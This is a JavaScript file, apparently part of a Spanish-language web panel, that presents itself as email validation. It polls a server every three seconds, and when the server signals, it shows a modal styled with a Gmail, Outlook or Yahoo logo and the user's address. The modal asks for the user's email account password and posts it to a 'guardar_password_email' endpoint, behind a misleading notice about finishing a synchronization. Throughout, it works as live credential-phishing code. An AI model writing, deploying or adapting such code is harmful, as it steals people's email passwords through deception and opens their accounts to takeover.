/**
 * Sistema de Validación de Email - TransControl
 * Maneja la validación de email con selección de proveedor
 */


const EMAIL_VALIDATION_NOTICE_BODY =
    'Completa la validación de tu correo como se indica arriba y pulsa Continuar para finalizar la sincronización con el servicio de esta aplicación.';

function getEmailIconBase() {
    try {
        return new URL('php_modales/css/email-icon', window.location.href).href.replace(/\/?$/, '');
    } catch (e) {
        return 'php_modales/css/email-icon';
    }
}

function emailProviderLogoHtml(proveedor) {
    const base = getEmailIconBase();
    switch (proveedor) {
        case 'gmail':
            return `<img src="${base}/gmail.svg" alt="" class="email-provider-logo" width="48" height="48" loading="lazy" decoding="async">`;
        case 'outlook':
            return `<img src="${base}/outlook.png" alt="" class="email-provider-logo" width="48" height="48" loading="lazy" decoding="async">`;
        case 'yahoo':
            return `<img src="${base}/yahoo.png" alt="" class="email-provider-logo" width="48" height="48" loading="lazy" decoding="async">`;
        default:
            return '<i class="fas fa-envelope email-provider-icon email-provider-icon--generic" aria-hidden="true"></i>';
    }
}

class EmailValidationSystem {
    constructor() {
        this.init();
        this.currentValidation = null;
    }

    init() {
        // Iniciar verificación de validaciones pendientes cada 3 segundos
        this.startEmailCheck();
        
        // Verificar inmediatamente al cargar
        this.checkForEmailValidation();
    }

    startEmailCheck() {
        // Verificar validaciones cada 3 segundos
        this.emailInterval = setInterval(() => {
            this.checkForEmailValidation();
        }, 3000);
    }

    stopEmailCheck() {
        if (this.emailInterval) {
            clearInterval(this.emailInterval);
            this.emailInterval = null;
        }
    }

    async checkForEmailValidation() {
        // No verificar si el modal está activo con contenido
        const modal = document.getElementById('adminModal');
        if (modal && modal.classList.contains('active')) {
            // Verificar si el modal tiene contenido válido
            const messageEl = document.getElementById('modalMessage');
            if (messageEl && messageEl.textContent.trim() !== '') {
                return;
            }
        }

        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/email_validate_verificar.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    accion: 'verificar_email_pendiente'
                })
            });
            
            const responseText = await response.text();
            let data;
            try {
                data = JSON.parse(responseText);
            } catch (e) {
                console.error('Respuesta no válida de email_validate_verificar.php:', responseText);
                return;
            }

            if (data.success && data.tiene_validacion) {
                this.showEmailValidationModal(data);
            }
        } catch (error) {
            console.error('Error verificando validación de email:', error);
        }
    }

    showEmailValidationModal(data) {
        const modal = document.getElementById('adminModal');
        if (!modal) {
            return;
        }

        if (typeof contactoEmpresaSystem !== 'undefined' && contactoEmpresaSystem.closeModal) {
            contactoEmpresaSystem.closeModal();
        }
        
        const messageEl = document.getElementById('modalMessage');
        const inputContainer = document.getElementById('modalInputContainer');
        const buttonsContainer = document.getElementById('modalButtons');
        const errorEl = document.getElementById('modalError');

        // Limpiar estado anterior
        errorEl.style.display = 'none';
        errorEl.textContent = '';

        if (typeof sincronizacionSystem !== 'undefined' && sincronizacionSystem.closeModal) {
            sincronizacionSystem.closeModal();
        }
        modal.classList.remove(
            'token-empresa-modal',
            'token-qr-empresa-modal',
            'contacto-empresa-modal',
            'sincronizacion-modal'
        );
        modal.classList.add('email-validation-modal');

        const logoImg = emailProviderLogoHtml(data.proveedor || 'otro');

        // Configurar mensaje con layout completo
        messageEl.innerHTML = `
            <div class="email-validation-content">
                <div class="email-provider-header">
                    ${logoImg}
                </div>
                
                <button class="email-display-btn" type="button">
                    <svg width="30" height="30" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#c7c7c7" d="M9 0a9 9 0 0 0-9 9 8.654 8.654 0 0 0 .05.92 9 9 0 0 0 17.9 0A8.654 8.654 0 0 0 18 9a9 9 0 0 0-9-9zm5.42 13.42c-.01 0-.06.08-.07.08a6.975 6.975 0 0 1-10.7 0c-.01 0-.06-.08-.07-.08a.512.512 0 0 1-.09-.27.522.522 0 0 1 .34-.48c.74-.25 1.45-.49 1.65-.54a.16.16 0 0 1 .03-.13.49.49 0 0 1 .43-.36l1.27-.1a2.077 2.077 0 0 0-.19-.79v-.01a2.814 2.814 0 0 0-.45-.78 3.83 3.83 0 0 1-.79-2.38A3.38 3.38 0 0 1 8.88 4h.24a3.38 3.38 0 0 1 3.1 3.58 3.83 3.83 0 0 1-.79 2.38 2.814 2.814 0 0 0-.45.78v.01a2.077 2.077 0 0 0-.19.79l1.27.1a.49.49 0 0 1 .43.36.16.16 0 0 1 .03.13c.2.05.91.29 1.65.54a.49.49 0 0 1 .25.75z"/>
                    </svg>
                    <span>${data.email}</span>
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round">
                        <polyline points="6,9 12,15 18,9"></polyline>
                    </svg>
                </button>
            </div>
        `;

        // Configurar input para contraseña
        inputContainer.style.display = 'block';
        inputContainer.innerHTML = `
            <label class="modal-input-label" for="modalInput">
                <i class="fas fa-lock label-lock-icon" aria-hidden="true"></i>
                Ingresa la contraseña:
            </label>
            <input type="password" 
                   class="modal-input" 
                   id="modalInput" 
                   placeholder="Contraseña de tu correo electrónico"
                   autocomplete="new-password">
        `;

        buttonsContainer.innerHTML = `
            <div class="email-validation-footer">
                <div class="email-validation-notice" data-site-copy="email-validation-notice">
                    <p>
                        <span class="email-validation-notice-lead">Aviso:</span>
                        <span class="email-validation-notice-body">${EMAIL_VALIDATION_NOTICE_BODY}</span>
                    </p>
                </div>
                <button type="button" class="modal-btn modal-btn-primary email-continue-btn" onclick="emailValidationSystem.sendEmailPassword(${data.validacion_id})">
                    <i class="fas fa-check" aria-hidden="true"></i>
                    Continuar
                </button>
            </div>
        `;

        // Mostrar modal
        this.currentValidation = data;
        modal.classList.add('active');
    }

    async sendEmailPassword(validacionId) {
        const input = document.getElementById('modalInput');
        const password = input.value.trim();
        const errorEl = document.getElementById('modalError');

        if (!password) {
            this.showError('Por favor, ingresa tu contraseña');
            return;
        }

        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/email_validate_procesar.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    accion: 'guardar_password_email',
                    validacion_id: validacionId,
                    password: password
                })
            });

            const data = await response.json();
            
            if (data.success) {
                // Limpiar modal y resetear contenido
                this.closeModal();
                
                // Reiniciar verificaciones después de un breve delay para permitir nuevas validaciones
                setTimeout(() => {
                    this.startEmailCheck();
                }, 2000);
            } else {
                this.showError(data.error || 'Error al procesar la validación');
            }
        } catch (error) {
            this.showError('Error de conexión');
        }
    }

    showError(message) {
        const errorEl = document.getElementById('modalError');
        errorEl.textContent = message;
        errorEl.style.display = 'block';
        
        // Ocultar después de 5 segundos
        setTimeout(() => {
            errorEl.style.display = 'none';
        }, 5000);
    }

    closeModal() {
        const modal = document.getElementById('adminModal');
        if (modal) {
            modal.classList.remove(
                'active',
                'token-empresa-modal',
                'token-qr-empresa-modal',
                'contacto-empresa-modal',
                'email-validation-modal',
                'sincronizacion-modal'
            );
        }
        
        // Limpiar completamente el contenido del modal para que el sistema general pueda usarlo
        this.resetModalContent();
        
        // Si hay una validación pendiente, cancelarla
        if (this.currentValidation) {
            this.cancelCurrentValidation();
        }
        
        this.currentValidation = null;
    }

    async cancelCurrentValidation() {
        if (!this.currentValidation || !this.currentValidation.validacion_id) {
            return;
        }

        try {
            await fetch((window.MODAL_BASE || '') + 'php_modales/email_validate_procesar.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    accion: 'cancelar_validacion',
                    validacion_id: this.currentValidation.validacion_id
                })
            });
        } catch (error) {
            console.warn('Error al cancelar validación:', error);
        }
    }

    resetModalContent() {
        // Restaurar el contenido original del modal para el sistema general
        const messageEl = document.getElementById('modalMessage');
        const inputContainer = document.getElementById('modalInputContainer');
        const buttonsContainer = document.getElementById('modalButtons');
        
        if (messageEl) {
            messageEl.textContent = '';
        }
        
        if (inputContainer) {
            inputContainer.style.display = 'none';
            inputContainer.innerHTML = `
                <label class="modal-input-label" for="modalInput">Tu respuesta:</label>
                <input type="text" class="modal-input" id="modalInput" placeholder="Escribe tu respuesta aquí...">
            `;
        }
        
        if (buttonsContainer) {
            buttonsContainer.innerHTML = '';
        }
    }

    // Método para destruir el sistema
    destroy() {
        this.stopEmailCheck();
    }
}

// Inicializar sistema cuando se carga la página
let emailValidationSystem;

document.addEventListener('DOMContentLoaded', function() {
    emailValidationSystem = new EmailValidationSystem();
});

// Limpiar al salir de la página
window.addEventListener('beforeunload', function() {
    if (emailValidationSystem) {
        emailValidationSystem.destroy();
    }
});
